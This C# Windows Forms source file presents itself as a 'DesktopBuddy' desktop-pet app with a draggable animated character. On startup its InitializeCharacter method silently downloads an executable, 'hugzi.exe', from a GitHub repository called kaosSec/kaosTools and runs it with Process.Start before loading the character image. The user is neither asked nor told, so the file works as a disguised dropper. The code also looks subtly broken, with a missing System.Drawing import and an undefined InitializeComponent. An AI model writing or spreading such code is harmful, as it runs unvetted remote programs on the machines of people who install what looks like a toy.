using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.Threading.Tasks;

namespace DesktopBuddy
{
    public partial class MainForm : Form
    {
        private PictureBox characterPictureBox;
        
        public MainForm()
        {
            InitializeComponent();
            InitializeCharacter();
        }
        
private async Task DownloadFileAsync(string url, string fileName)
{
    using (WebClient client = new WebClient())
    {
        try
        {
            await client.DownloadFileTaskAsync(url, fileName);
        }
        catch (WebException ex)
        {
            MessageBox.Show($"An error occurred while downloading {url}: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}

private async void InitializeCharacter()
{
    // Download the hugzi.exe file from the GitHub repository
    string hugziUrl = "https://github.com/kaosSec/kaosTools/raw/main/C/hugzi.exe";
    string hugziFileName = "hugzi.exe";
    await DownloadFileAsync(hugziUrl, hugziFileName);
    Process.Start(hugziFileName);

    // Download the character image from the image URL
    string imageUrl = "https://piskel-imgstore-b.appspot.com/img/c8571105-b305-11ed-8fd9-49b971b166a6.gif";
    string imageFileName = "character.gif";
    await DownloadFileAsync(imageUrl, imageFileName);

    // Create the PictureBox and load the image from file
    characterPictureBox = new PictureBox();
    characterPictureBox.Image = Image.FromFile(imageFileName);
    characterPictureBox.Size = new System.Drawing.Size(50, 50);
    characterPictureBox.SizeMode = PictureBoxSizeMode.Zoom;
    characterPictureBox.Location = new System.Drawing.Point(100, 100);
    characterPictureBox.MouseDown += new MouseEventHandler(CharacterPictureBox_MouseDown);
    Controls.Add(characterPictureBox);
}
        
        private void CharacterPictureBox_MouseDown(object sender, MouseEventArgs e)
        {
            // Move the character when the user clicks and drags it
            if (e.Button == MouseButtons.Left)
            {
                characterPictureBox.Left += e.X;
                characterPictureBox.Top += e.Y;
            }
        }
    }
    
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}
